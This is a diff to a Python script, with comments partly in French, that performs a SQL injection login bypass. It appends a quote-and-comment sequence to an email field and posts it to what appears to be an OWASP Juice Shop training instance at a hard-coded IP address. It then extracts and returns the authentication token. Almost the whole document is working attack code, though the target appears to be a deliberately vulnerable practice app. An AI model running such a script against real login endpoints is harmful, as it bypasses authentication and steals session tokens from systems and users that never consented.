@@ -1,18 +1,39 @@
 import requests
-from tkinter import messagebox
 
-def simulate_sql_injection(url, payload):
+def simulate_sql_injection(url, username):
+    """
+    :param url: L'URL of API endpoint to test.
+    :param username: username for SQL injection.
+    :return: authentification token if it worked, else None.
+    """
+    payload = f"{username}'--"
+
     try:
-        response = requests.post(url, data={'username': payload, 'password': 'password'})
-        print(f"Statut de la requête: {response.status_code}")
-        print(f"Contenu de la réponse:\n{response.text}")
+        
+        response = requests.post(url, data={'email': payload, 'password': 'password'})
 
-        if "Erreur SQL" in response.text or "database" in response.text.lower():
-            messagebox.showinfo("Résultat", "Injection SQL réussie !")
-            with open("extracted_data.txt", "w") as f:
-                f.write("Contenu extrait :\n")
-                f.write(response.text)
-        else:
-            messagebox.showinfo("Résultat", "Pas de vulnérabilité détectée.")
+        print(f"Request status: {response.status_code}")
+        print(f"Response:\n{response.text}")
+
+        # Extraction du token d'authentification si présent
+        try:
+            token = response.json().get("authentication", {}).get("token", None)
+            if token:
+                print(f"Token: {token}")
+                return token
+            else:
+                print("No token auth")
+                return None
+        except ValueError:
+            print("Response not in JSON format")
+            return None
+
     except requests.RequestException as e:
-        messagebox.showerror("Erreur", f"Problème avec la requête : {e}")
+       print("Error", f"Request error : {e}")
+       return None
+
+if __name__ == "__main__":
+    target_url = "http://45.76.47.218:3000/rest/user/login"
+    username_input = "mc.safesearch@juice-sh.op"
+
+    auth_token = simulate_sql_injection(target_url, username_input)
